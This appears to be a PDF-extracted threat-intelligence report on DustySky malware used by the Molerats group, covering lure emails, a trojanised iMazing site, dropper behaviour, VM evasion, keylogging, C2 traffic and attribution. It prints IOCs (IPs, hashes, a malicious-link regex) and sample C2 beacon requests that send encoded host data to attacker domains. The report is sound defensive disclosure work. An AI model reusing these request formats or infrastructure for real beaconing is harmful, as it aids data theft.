Foreword 

DustySky (called “NeD Worm” by its developer) is a multi-stage malware in use since May 2015. It is in use by 
the Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is 
intelligence gathering.  Operating since 2012, the group's activity has been reported by Norman 1, 
Kaspersky2,3, FireEye4, and PwC5. 

This report revolves around a campaign that includes a new malware developed by a member of the group 
or on behalf of the group. Based on dozens of known attacks and the vast infrastructure in use - we estimate 
that a wave of targeted malicious email messages has been sent on a weekly basis.  

These attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets 
rather than random mass distribution, but are not tailored specifically to each and every target. Dozens of 
targets may receive the exact same message. The email message and the lure document are written in 
Hebrew, Arabic or English - depending on the target audience.  

Targeted sectors include governmental and diplomatic institutions, including embassies; companies from the 
aerospace and defence Industries; financial institutions; journalists; software developers.  

The attackers have been targeting software developers in general, using a fake website pretending to be a 
legitimate iOS management software, and linking to it in an online freelancing marketplace.  

Most targets are from the Middle East: Israel, Egypt, Saudi Arabia, United Arab Emirates and Iraq. The United 
States and countries in Europe are targeted as well. 

Acknowledgments

Tactics, Techniques and Procedures 

Delivery  

The attackers would usually send a malicious email message that either links to an archive file (RAR or ZIP 
compressed) or has one attached to it.  Below are malicious email messages that have been sent to multiple 
targets on September and December 2015.

The link may include these parameters: 

 

Id - the ID of the current wave of malicious email messages, composed of a plaintext word, a plus 
sign, and a number. For example: Rand+281 
token1 - same as id, but Base64 encoded 
token2 - Base64 encoded email address of the target to which the malicious message was sent. 

 
 
  C - the word Click or openexe 

The following regular expression matches the structure of malicious links: 

\/[A-Za-z]+\.php\?((?:id|token1|token2|C)=[A-Za-z0-9\/=+%]*={0,2}&?){4} 

For example: 
spynews.otzo[.]com/20151104/Update.php?id=>redacted>&token1=>redacted>&token2=>redacted>&C=Cli
ck 

The archive contains an .exe file, sometimes disguised as a Microsoft Word file, a video, or another file 
format, using the corresponding icon. For example: 

Lure content and sender identity 

If the victim extracts the archive and clicks the .exe file, the lure document or video are presented while the 
computer is being infected with DustySky. 

In recent samples the group used Microsoft Word files embed with a malicious macro, which would infect 
the victim if enabled. Note, that these infection methods rely on social engineering - convincing the victim to 
open the file (and enabling content if it is disabled) - and not on software vulnerabilities. 

The subject line of the malicious email message, as well as the name and content of the lure document, are 
usually related to recent events in diplomacy, defense, and politics. Sometimes lure topics are gossip or sex 
related and might even include a pornographic video. In recent samples, fake invoices and a copy of the 
public Google privacy policy were used. 

The content of the lure document is always copied from a public news item or other web content, and is 
never an original composition of the attackers.  

The “from” field in malicious messages is usually set to be related to the lure document, such as “Latest 
Israel news”, “Israeli Hot Stories”, “Israel Defense Forces“, تاسايسلل تاراملإا زكرم
Policy Center organization6). 

” (impersonates the Emirates 

 "

6 “The center undertakes the task of foreseeing the future of region, regional and international policy trends and the 
impact of different geopolitical projects on the region. It aims at providing strategic analysis, policy papers, studies, and 
research to serve the decision makers at any institution or country in the region with a priority given to UAE.”

When linked from the malicious message, the malware would be hosted either on a cloud service (many 
times in copy.com, a legitimate file hosting service), or on a server controlled by the attackers.  

Phishing 

When the malware is hosted on a server controlled by the attackers, the User-Agent string of the target’s 
browser is checked when they click the malicious link. If the target is using Windows, DuskySky is served. If 
the operating system is different than Windows, the target is served a Google, Microsoft, or Yahoo phishing 
page:

Page 6 of 42 

 
 
 
The source code of the phishing page is made up of a single JavaScript block, which at runtime decodes a 
single variable into HTML:  

After the victim fills in and sends the fake login form, they are redirected to a legitimate website. For 
example, in one case the victim was redirected to a news item7 in the Israeli news website NRG. Only the 
news item was old (from one year prior to the attack) and unrelated to the original subject of the malicious 
email message. It was probably used in previous attacks, and the attackers did not care enough or forgot to 
change it to a relevant one. 

Attacks against software developers 

IP address 45.32.13.169 and all the domains that are pointing to it8 host a webpage which is a copy of a 
legitimate and unrelated software website - iMazing, an iOS management software.

Among the domains is a similar looking one - imazing[.]ga.  

The source code of the fake website reveals that it was copied from the legitimate source on 22 October 
2015: 

The fake website, similarly to the legitimate one, offers visitors to download the iMazing software. However, 
the version on the fake website is bundled with DustySky malware. Upon execution of the malicious version 
(2f452e90c2f9b914543847ba2b431b9a) the legitimate iMazing is installed, while in the background 
DustySky is dropped as a file named Plugin.exe (1d9612a869ad929bd4dd16131ddb133a), and executed:  

Plugin.exe immediately starts communicating with its command and control sever using the hardcoded 
address ns.suppoit[.]xyz and supo.mefound[.]com, both also pointing to above mentioned 45.32.13.169. 

Interestingly, we found the fake domain imazing[.]ga mentioned in a job posting9 in the freelancers 
marketplace website freelancer.com. In the posting, the attackers claim they are looking for someone to

build “an application like that this website [sic]” and entice the viewer to “download application and take an 
overlook [sic]” from imazing[.]ga and “Let me know if any idea is missing or…”.  

This behavior deviates from the attackers’ usual pattern of sending malicious email to selected (albeit many) 
individuals. It is unclear to us why they would go after random infections, but we can imagine various 
reasons, such as access to computers which would be used as proxies for attacks, or access to licenses for 
software owned by the victims. 

Post infection 

This section describes the actions performed by the attackers on infected computers we have investigated.  

After infecting the computer, the attackers used both the capabilities of DustySky, and those of public 
hacking tools they had subsequently downloaded to the computer.

They took screenshots and a list of active processes in the computer, and sent them to their command and 
control severs. They used BrowserPasswordDump10, a public and free-to-use tool that recovers passwords 
saved in browsers. Below is the log file (empty in this case) that we recovered after the attackers had deleted 
it: 

The malware would also scan the computer for files that contain certain keywords. The list of keywords, in 
base64 format, is retrieved from the command and control as a text file. For example: 

Below are the encoded strings from the above image, decoded and translated:

These words teach us what the attackers are after: personal documents; credentials, certificates 
and private keys; information pertaining to homeland security.  

Abusing breached email account 

In one case, the attackers used stolen email credentials and logged in from 96.44.156.201, potentially their 
proxy or VPN endpoint. They also logged in from 5.101.140.118 , an IP address that belongs to a proxy 
service called privatetunnel.com (in previous incidents, emails were sent from a nearby address - 
5.101.140.114).

Malware analysis 

DustySky (called NeD by its developer) is a multi-stage malware written in .NET. This chapter reviews its 
functionality and main features. The sample analyzed is f589827c4cf94662544066b80bfda6ab from late 
August 2015. It is composed of a DustySky dropper, DustySky core, and the DustySky keylogging component. 

DustySky dropper 

The DustySky dropper tries to evade running in a virtual machine. Once sure the computer is not a VM, it 
extracts, runs and adds persistency to DustySky Core. It extracts basic information about the operating 
system and checks for the existence of an Antivirus. It also extracts and opens the lure document.  

The dropper's resources are two components that are dropped at run time. One is the lure document 
(internally called “news”), which is presented to the victim once the dropper is executed. The other is 
DustySky Core, a Trojan backdoor, (internally called “log”). 

The dropper uses the following function to obfuscate the name of functions and other parts of the malware 
(In later versions, SmartAssembly 6.9.0.114 .NET obfuscator was used): 

So, for example, the following string:  

Is encoded as:  

For VM evasion the dropper checks whether there is a DLL that indicate that the malware is running in a 
virtual machine (vboxmrxnp.dll and vmbusres.dll which indicate vitualbox and vmGuestlib.dll which indicates 
vmware).

If the dropper is indeed running in a virtual machine, it will open the lure document and stop its activity:  

The dropper uses Windows Management Instrumentation11 to extract information about the operating 
system and whether an antivirus is active.  

DustySky Core is dropped to %TEMP% and runs using either cmd or the .NET interface.

A registry entry is created for persistency after computer restart:  

DustySky core 

DustySky Core is a Trojan backdoor and the main component of the malware. It communicates with the 
command and control server, exfiltrates collected data, information and files, and receives and executes 
commands.  It has the following capabilities:  

  Collecting information about the OS version, running processes and installed software. 
  Searching for removable media and network drives, and duplicating itself into them. 
  Extracting other components (such as the keylogging component) or receiving them from the 

command and control server, and running or removing them. 

  Evading virtual machines. 
  Turning the computer off or restarting it. 
  Making sure only a single instance of the malware is running. 

The keylogging log file is uploaded to the server every 50 seconds. The files are uploaded via a POST request 
to a URL that ends with key.php.

DustySky keylogging component  

One of the components contained in DustySky core is a keylogger (for example 
15be036680c41f97dfac9201a7c51cfc). When ordered by the command and control server, the keylogger is 
extracted and executed. Keylogging logs are saved to %TEMP%\temps . 

pdb analysis 

pdb strings in DustySky sample were structured as follows: 

b:\World-2015\IL\Working Tools\2015-12-27 NeD Ver 9 Rand - 192.169.6.199\NeD 
Worm\obj\x86\Release\MusicLogs.pdb 

pdb strings from 23 samples are presented in “Appendix B - Indicators”. In the table below we present a 
breakdown of folders and file names comprising the pdb strings, to reflect the ongoing development cycle of 
DustySky since its first release in May 2015.

Command and control communication 

Traffic examples 

Following are samples of communication with the command and control server (identifiers have been 
altered). 

DustySky has two hardcoded domains of command and control servers. It starts by checking if the first one is 
alive by sending a GET request to TEST.php or index.php, expecting “OK” as response. If it does not receive 
an OK, it will try a second domain. 

For example, this is an Initial GET request to index.php: 

GET /index.php HTTP/1.1 
Host: facetoo.co].[vu 
Connection: Keep-Alive 

Server reply: 

HTTP/1.1 200 OK 
Date: Sun, 06 Sep 2015 19:52:49 GMT 
Server: Apache/2.2.15 (CentOS) 
X-Powered-By: PHP/5.3.3 
Content-Length: 2  
Connection: close 
Content-Type: text/html; charset=UTF-8 

OK 

Next, a GET request is sent with information about the infected computer as Base64 parameters: 

GET 
/IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&fr=&GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS
0wOC0yNA&com=IDxicj4gIDxicj4g&ID=386578203222222738119472812481673914678
&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&ho=ZmFjZXRvby5jby52dQ==&

User-Agent: 386578203222222738119472812481673914678 
Host: facetoo.co].[vu 

Another example of a URL in the GET request: 

http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR
=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=133279209241

SSL and digital certificates  

Recently, command and control communication changed from HTTP to HTTPS. The digital certificate used in 
the HTTPS traffic is either self-signed or uses a legitimate Comodo issued certificate.   

The domain bulk-smtp[.]xyz, which is owned by the attackers, uses the following digital certificate:

Infrastructure   

Using PassiveTotal's attack analysis platform, we were able to visualize the last 6 months of data for key 
infrastructure used by the actors. It's worth noting that all IP addresses have been active in the past several 
weeks with many of the domains resolving to them being a combination (green squares) of dynamic DNS 
providers (blue squares) and registered domains (brown squares). These heatmaps allow us to identify 
interesting periods or changes in the infrastructure that may have been due to actors adjusting their tactics. 

Reader: 

192.161.48.59  

In this graph, we can see the actors used a combination of dynamic DNS and registered domains up until 
December 23rd. On that day, the actors seem to remove the registered domain and strictly use dynamic 
DNS. It's unclear why this would occur, but it's possible that the server changed functions in the attack or 
was no longer needed.  

192.52.167.235 

In this graph, the colors clearly segment activity that occurred. The primary period of interest appears to be 
when both dynamic DNS and registered domains are in use. This occurs from September 23rd to December 
17th and has a number of days where new domains are associated to the IP address. While not entirely 
known, this period could reflect the actors going live in their operation. Based on emails sent and 
compilation dates, there were plenty of phishing campaigns going on during this period of time. It's also 
worth noting that this IP address is no longer showing any content which could mean it's been taken offline.

167.160.36.14 

In this graph, we see activity starting on September 9th being directed to a dynamic DNS provider. Similar to 
Graph One, we can see an increase in domains around the November timeframe with a drop-off in 
December. Again, not entirely clear, but November may have been a point where the attackers felt the need 
to diversify the domains they were using in attacks.  

45.32.13.169

In this graph, the gray blocks indicate that no activity was captured for a majority of the time. Starting 
November 9th, the actors introduced four unique, registered domains before then adding dynamic DNS 
providers. What's most interesting about this IP address is that the content for both dynamic DNS urls and 
registered domains lead to the same download page that hosts a Windows executable. It's unclear why the 
attackers continue to use both, but the move from registered domains to also using dynamic DNS domains 
could suggest the actors are beginning to wise up. The use of dynamic DNS infrastructure makes attribution 
and tracking more difficult as a dynamic DNS domain could be shared by unrelated parties.

72.11.148.147  

In this graph, we see the same lack of data until recent months and the use of both dynamic DNS and 
registered domains. Given the recent activity and a large amount of domains being pointed at this IP 
address, it's plausible that this server may be the most current of the actors. In fact, it could be involved in 
on-going operations that we have seen into this year.

Threat actor and Attribution 

We attribute the DustySky attacks, with medium-high certainty, to the same group that FireEye12 called 
Molerats and Kaspersky13 called Gaza cybergang. Based on the following characteristics14.

Only one sample – aa288a5cbf4c897ff02238e851875660 – was uploaded to VirusTotal, shortly after it was 
compiled. Less than a minute and a half elapsed between compilation on August 8th 2015 at 10:31:12 and 
the first VirusTotal submission at 10:32:24. This sample was uploaded from Gaza. 

The very short time frame between compilation and VirusTotal submission could indicate that the attacker is 
the one who has submitted the sample – in order to learn whether antivirus engines detect it.

Some of the malicious email messages, for example those containing “Supermodel Bar Refaeli Stars in Israeli 
ףשח
Spy Movie.exe” and “
.exe” (Hamas unveiled a documentation of Gilad 
Shalit in captivity), were sent from 185.12.187.10515 and 31.223.186.7116 respectively. Both IPs belong to 
internet provider CITYNET17, based in Gaza Strip.
